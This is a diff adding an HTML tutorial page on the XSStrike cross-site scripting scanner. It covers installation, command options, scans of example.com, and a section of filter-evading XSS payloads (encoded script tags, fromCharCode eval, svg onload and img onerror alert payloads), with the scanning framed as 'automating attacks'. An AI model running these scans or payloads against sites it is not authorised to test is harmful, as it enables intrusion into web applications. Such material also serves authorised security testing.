@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSSStrike - Advanced Hacking Guide</title>
+    <style>
+        body {
+            background-color: black;
+            color: #00ff00;
+            font-family: "Courier New", monospace;
+            padding: 20px;
+        }
+        h1, h2 {
+            text-align: center;
+            text-transform: uppercase;
+        }
+        .section {
+            border-left: 4px solid #ff0000;
+            padding-left: 15px;
+            margin: 20px 0;
+        }
+        code {
+            background-color: rgba(255, 0, 0, 0.2);
+            padding: 10px;
+            display: block;
+            margin-top: 10px;
+            white-space: pre-wrap;
+            color: #ff0000;
+        }
+        .highlight {
+            color: #ff0000;
+            font-weight: bold;
+        }
+        .note {
+            color: yellow;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>XSSStrike - Advanced Hacking Guide</h1>
+
+    <div class="section">
+        <h2>1. Installing XSSStrike</h2>
+        <p>XSSStrike is an advanced XSS scanner. Install it with:</p>
+        <code>
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip3 install -r requirements.txt
+python3 xsstrike.py -h
+        </code>
+    </div>
+
+    <div class="section">
+        <h2>2. Understanding the Help Menu (-h)</h2>
+        <p>To see all available options, run:</p>
+        <code>python3 xsstrike.py -h</code>
+        <p>You'll see:</p>
+        <code>
+usage: xsstrike.py [-h] [-u URL] [-t THREADS] [-l LEVEL] [--params] [--crawl]
+                   [--fuzzer] [--waf] [--update]
+
+optional arguments:
+  -h, --help            Show help message and exit
+  -u URL, --url URL     Target URL
+  -t THREADS, --threads THREADS  Number of threads
+  -l LEVEL, --level LEVEL  Scan intensity (1-3)
+  --params              Detect parameters automatically
+  --crawl               Crawl the website for inputs
+  --fuzzer              Use fuzzing to detect bypasses
+  --waf                 Detect Web Application Firewall
+  --update              Update XSSStrike
+        </code>
+    </div>
+
+    <div class="section">
+        <h2>3. Basic Usage - Scanning a Target</h2>
+        <p>Scan a single URL:</p>
+        <code>python3 xsstrike.py -u "http://example.com/search.php?q=test"</code>
+        <p>Scan with automatic parameter detection:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" --params</code>
+        <p>Increase speed using multiple threads:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" -t 10</code>
+    </div>
+
+    <div class="section">
+        <h2>4. Advanced Techniques</h2>
+        <p>Enable the fuzzer for WAF evasion:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" --fuzzer</code>
+        <p>Enable deep crawling:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" --crawl</code>
+        <p>Detect if a WAF is present:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" --waf</code>
+    </div>
+
+    <div class="section">
+        <h2>5. Automating Attacks</h2>
+        <p>Run a full automated scan:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" --params --fuzzer --waf -t 10</code>
+        <p>Save results to a file:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" > results.txt</code>
+    </div>
+
+    <div class="section">
+        <h2>6. Bypassing WAFs (Stealth Mode)</h2>
+        <p>Try encoded payloads to evade filters:</p>
+        <code>%3Cscript%3Ealert('XSS')%3C/script%3E</code>
+        <p>Use JavaScript encoding:</p>
+        <code>&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code>
+        <p>SVG-based XSS attack:</p>
+        <code>&lt;svg onload=alert(1)&gt;</code>
+        <p>Inside an image attribute:</p>
+        <code>&lt;img src=x onerror=alert(1)&gt;</code>
+    </div>
+
+    <div class="section">
+        <h2>7. Creating a Custom Payload Wordlist</h2>
+        <p>Step 1: Create a wordlist:</p>
+        <code>
+echo "&lt;script&gt;alert('XSS')&lt;/script&gt;" > my_xss_payloads.txt
+echo "&lt;img src=x onerror=alert(1)&gt;" >> my_xss_payloads.txt
+        </code>
+        <p>Step 2: Use the wordlist in XSSStrike:</p>
+        <code>python3 xsstrike.py -u "http://example.com/" --params --fuzzer --waf --payloads my_xss_payloads.txt</code>
+    </div>
+
+    <h2 style="text-align:center;" class="highlight">Focus Level: 99999999999999999999999999999999999999999999999%</h2>
+
+</body>
+</html>
